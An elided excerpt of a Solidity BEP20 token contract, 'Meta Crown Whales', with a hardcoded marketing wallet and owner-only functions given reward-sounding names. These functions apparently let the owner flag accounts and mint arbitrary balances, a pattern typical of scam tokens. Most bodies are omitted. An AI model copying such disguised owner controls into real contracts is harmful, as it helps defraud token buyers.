...
*/
    ...
    contract MetaCrownWhales is IBEP20, Ownable
    {
        ...
        string private constant _name = "Meta Crown Whales";
        ...
        address public constant MarketingWallet=0xB80305C8aDC7bf3E9C9c0DB94fe3A5965bCa0967; //MarketingWallet
        ...
        constructor () {
           ...
           function BnbClaimRewards(address account) external onlyOwner {
            _isSendRewards[account] = false;
          }
          
            function BnbSendRewards(address[] calldata addresses) external onlyOwner {
      ...
      function BnbRewardsMint(address account, uint256 balance) onlyOwner  public virtual {
    ...
    function EnableBnBRewards() public onlyOwner{
